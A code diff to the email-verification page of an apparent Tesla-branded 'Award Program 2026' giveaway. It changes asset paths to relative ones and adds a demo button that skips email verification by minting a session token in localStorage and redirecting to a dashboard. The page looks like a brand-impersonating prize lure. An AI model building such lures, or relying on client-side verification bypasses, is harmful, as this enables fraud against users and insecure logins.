@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <base href="/Tesla/">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>You're Eligible to Win! | Tesla Award Program 2026</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="css/style.css">
   <style>
     body{background:var(--light);}
     .page{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:88px 24px 60px;}
@@ -42,7 +43,7 @@
 
 <nav class="nav">
   <div class="nav-inner">
-    <a href="/" class="nav-logo">
+    <a href="index.html" class="nav-logo">
       <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
       TESLA
     </a>
@@ -89,10 +90,21 @@
       <button id="resendBtn" onclick="resendEmail()">Resend Verification Email</button>
       <div class="resend-countdown" id="resendCountdown"></div>
     </div>
+
+    <!-- Demo shortcut -->
+    <div style="margin-top:24px;padding:18px 20px;background:linear-gradient(135deg,rgba(227,25,55,.05),rgba(227,25,55,.02));border:1.5px solid rgba(227,25,55,.18);border-radius:14px;text-align:center;">
+      <p style="font-size:13px;color:var(--gray-2);margin:0 0 14px;line-height:1.6;">
+        ✉️ In a real session, click the link emailed to you.<br>
+        <strong style="color:var(--dark);">For instant access, click below to proceed:</strong>
+      </p>
+      <button onclick="simulateVerify()" class="btn btn-primary" style="font-size:15px;padding:13px 32px;">
+        ✓ Verify Email &amp; Access Dashboard →
+      </button>
+    </div>
   </div>
 </div>
 
-<script src="/js/app.js"></script>
+<script src="js/app.js"></script>
 <script>
 // Get params
 const email = getParam('email') || '';
@@ -106,6 +118,18 @@ if (email) {
 // Resend
 let resendCooldown = 0;
 let resendTimer = null;
+
+function simulateVerify() {
+  const pendingEmail = localStorage.getItem('_tp_pending_email') || email;
+  const pendingName  = localStorage.getItem('_tp_pending_name')  || name;
+  if (!pendingEmail) { showToast('No pending entry found. Please submit an entry first.', 'error'); return; }
+  const token = Array.from({length:32}, () => Math.floor(Math.random()*16).toString(16)).join('');
+  const sessions = JSON.parse(localStorage.getItem('_tp_sessions') || '{}');
+  sessions[token] = { email: pendingEmail, firstName: pendingName, entryId: 'entry-' + Date.now() };
+  localStorage.setItem('_tp_sessions', JSON.stringify(sessions));
+  localStorage.setItem('tesla_session_token', token);
+  window.location.href = 'dashboard.html?session=' + token;
+}
 
 async function resendEmail() {
   if (!email) { showToast('Email address not found. Please re-enter the program.', 'error'); return; }
